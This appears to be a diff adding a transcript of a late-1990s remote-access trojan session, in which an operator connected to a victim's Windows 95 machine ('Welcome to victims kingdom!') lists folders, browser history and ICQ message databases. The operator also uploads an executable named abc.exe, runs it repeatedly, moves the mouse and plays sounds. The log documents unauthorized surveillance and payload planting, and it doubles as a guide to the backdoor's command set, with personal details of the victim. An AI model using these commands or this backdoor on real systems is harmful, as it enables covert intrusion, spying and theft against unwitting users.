@@ -1,0 +1,296 @@
+// Trying to connect 192.168.1.41:23145 ...
+// Connected!
+Srv: 100 Welcome to victims kingdom!
+You: machinename <CR-LF>
+Srv: STEVE
+
+You: username <CR-LF>
+Srv: 110 Command not recognized. Type voculbary to know valid commands.
+
+You: loginname <CR-LF>
+Srv: steve
+
+You: starttime <CR-LF>
+Srv: 27/07/98 12:03:46
+
+You: dir/ad <CR-LF>
+Srv: 125 DIR/AD command completed.
+
+You: disksize c: <CR-LF>
+Srv: Total Disk capacity for c: is 0
+
+You: disksize c:\ <CR-LF>
+Srv: Total Disk capacity for c:\ is 2006286336
+
+You: disksize d:\ <CR-LF>
+Srv: Total Disk capacity for d:\ is 0
+
+You: freespace c: <CR-LF>
+Srv: Total free disk space for c: is 0
+
+You: freespace c:\ <CR-LF>
+Srv: Total free disk space for c:\ is 82575360
+
+You: icquindir <CR-LF>
+Srv: C:\Program Files\ICQ\UIN
+
+You: dir  C:\Program Files\ICQ\UIN\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     102 7467537.uin
+125 DIR command completed.
+
+You: winpath <CR-LF>
+Srv: Victims Windows dir is:C:\WINDOWS
+
+You: dir c:\windows\history\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     65 desktop.ini
+     24576 MM256.DAT
+     24576 MM2048.DAT
+     557056 index.dat
+<DIR>0 MSHist011998062919980706
+<DIR>0 MSHist011998072719980728
+<DIR>0 MSHist011998062219980629
+<DIR>0 MSHist011998052519980601
+<DIR>0 MSHist011998072319980724
+<DIR>0 MSHist011998061519980622
+<DIR>0 MSHist011998060819980615
+<DIR>0 MSHist011998060119980608
+<DIR>0 MSHist011998070619980713
+<DIR>0 MSHist011998071319980720
+<DIR>0 MSHist011998072019980727
+125 DIR command completed.
+
+You: dir c:\program files\icq\db\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     2825 7467537.dat
+     106 7467537.idx
+     197 7467537his.dat
+     42 7467537his.idx
+     172 7467537ign.dat
+     26 7467537ign.idx
+     10687 7467537msg.dat
+     938 7467537msg.idx
+     481 7467537snd.dat
+     58 7467537snd.idx
+125 DIR command completed.
+
+You: filesize c:\program files\icq\db\7467537msg.dat <CR-LF>
+Srv: 10687
+
+You: dir c:\windows\temporary internet files\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     131072 index.dat
+     67 desktop.ini
+<DIR>0 IOAA0T7D
+<DIR>0 B0DHOA2O
+<DIR>0 GZI1KL4N
+<DIR>0 9YHC186P
+125 DIR command completed.
+
+You: getvol <CR-LF>
+Srv: 0934-1C00 OMNIBOOK
+
+You: beep <CR-LF>
+Srv: 125 BEEP command completed.
+
+You: dir/ad c:\*.* <CR-LF>
+Srv: <DIR>0 Program Files
+
+Srv: <DIR>0 WINDOWS
+<DIR>0 Exchange
+<DIR>0 Tools
+<DIR>0 MSOffice
+<DIR>0 Download
+<DIR>0 Projects
+<DIR>0 Info
+<DIR>0 Programs
+<DIR>0 My Documents
+<DIR>0 Backup
+125 DIR/AD command completed.
+
+You: dir c:\downloads\*.* <CR-LF>
+Srv: <VOL>2087499221 
+
+Srv: 125 DIR command completed.
+
+You: dir c:\download\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     6484 INTL.TXT
+     49600 SETUP.TXT
+<DIR>0 Rajan
+<DIR>0 Retain
+<DIR>0 QuickDrive
+     603518 Oxlade John.print
+     1099 stars-7.gif
+<DIR>0 Dump
+     13853 Oxlade Ftw 10  I.G.I..GED     John.GED
+<DIR>0 _New
+<DIR>0 Secure Dump
+125 DIR command completed.
+
+Srv: 110 Command not recognized. Type voculbary to know valid commands.
+
+
+You: echo dfdfd <CR-LF>
+Srv: dfdfd
+
+You: takefile "183808" "c:\abc.exe" <CR-LF>
+Srv: Ready to accept file c:\abc.exe
+
+Srv: 125 PUTFILE command completed.
+
+You: exec c:\abc.exe <CR-LF>
+Srv: 120 Command requires two parameters: CMD "param1" "param2".
+
+Srv: 125 EXEC command returned 0
+
+You: exec "c:\abc.exe" "" <CR-LF>
+Srv: 125 EXEC command returned 0
+
+You: exec "c:\abc.exe" "" <CR-LF>
+Srv: 125 EXEC command returned 0
+
+You: exec "" "c:\abc.exe" <CR-LF>
+Srv: 125 EXEC command returned 0
+
+You: dir c:\*.exe <CR-LF>
+Srv:      183809 abc.exe
+
+Srv: 125 DIR command completed.
+
+You: run "C:\abc.exe" "" <CR-LF>
+Srv: 125 EXEC command returned 0
+
+You: run "C:\abc.exe" "" <CR-LF>
+Srv: 125 EXEC command returned 0
+
+You: mousemove "10" "10" <CR-LF>
+Srv: 110 Command not recognized. Type voculbary to know valid commands.
+
+You: movemouse "10" "10" <CR-LF>
+Srv: 125 MOUSEMOVE command completed.
+
+You: osver <CR-LF>
+Srv: Win32 on Win95 Ver. 4.0.67306684
+
+You: dir c:\windows\*.wav <CR-LF>
+Srv: <VOL>6814336 
+
+Srv: 125 DIR command completed.
+
+You: dir/ad c:\MSOffice\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+<DIR>0 Office
+<DIR>0 Access
+<DIR>0 Winword
+<DIR>0 Templates
+<DIR>0 WINPROJ4
+<DIR>0 Powerpnt
+125 DIR/AD command completed.
+
+You: dir/ad c:\MSOffice\office\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+<DIR>0 Setup
+<DIR>0 MSN
+125 DIR/AD command completed.
+
+You: dir/ad c:\windows\media\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+<DIR>0 Office97
+125 DIR/AD command completed.
+
+You: dir/ad c:\windows\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+<DIR>0 COMMAND
+<DIR>0 CONFIG
+<DIR>0 CURSORS
+<DIR>0 DESKTOP
+<DIR>0 NECSS610
+<DIR>0 FORMS
+<DIR>0 HELP
+<DIR>0 JAVA
+<DIR>0 MEDIA
+<DIR>0 OPTIONS
+<DIR>0 Favorites
+<DIR>0 SYSTEM
+<DIR>0 WANGSAMP
+<DIR>0 WORDVIEW
+<DIR>0 GOODIES
+<DIR>0 TEMP
+<DIR>0 Start Menu
+<DIR>0 SendTo
+<DIR>0 MSREMOTE.SFS
+<DIR>0 QuickDrive
+<DIR>0 MSAPPS
+<DIR>0 AddIns
+<DIR>0 CatRoot
+<DIR>0 Subscriptions
+<DIR>0 Web
+<DIR>0 Application Data
+<DIR>0 ol98logs
+<DIR>0 ATTSVRS
+<DIR>0 Profiles
+<DIR>0 Personal
+125 DIR/AD command completed.
+
+You: dir/ad c:\windows\media\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+<DIR>0 Office97
+125 DIR/AD command completed.
+
+You: dir c:\windows\media\*.* <CR-LF>
+Srv: <DIR>0 .
+
+Srv: <DIR>0 ..
+     15906 IR_BEGIN.WAV
+     42728 IR_END.WAV
+     75508 IR_INTER.WAV
+     20861 CANYON.MID
+     23165 PASSPORT.MID
+     21312 Beethoven's Fur Elise.rmi
+<DIR>0 Office97
+     15932 CHIMES.WAV
+     24994 CHORD.WAV
+     11586 DING.WAV
+     27516 TADA.WAV
+     135900 The Microsoft Sound.wav
+     92466 Beethoven's 5th Symphony.rmi
+     27940 Debussy's Claire de Lune.rmi
+     20906 Dance of the Sugar-Plum Fairy.rmi
+     38444 In the Hall of the Mountain King.rmi
+     18130 Mozart's Symphony No. 40.rmi
+     144902 Bach's Brandenburg Concerto No. 3.rmi
+125 DIR command completed.
+
+You: playsound c:\windows\media\ding.wav <CR-LF>
+Srv: 120 Command requires two parameters: CMD "param1" "param2".
+
+Srv: 125 PLAYSOUND command returned: True
+
+You: playsound "c:\windows\media\chord.wav" "" <CR-LF>
+Srv: 125 PLAYSOUND command returned: True
+
+You: activewin <CR-LF>
+Srv: Handle: 0 Caption: 
+
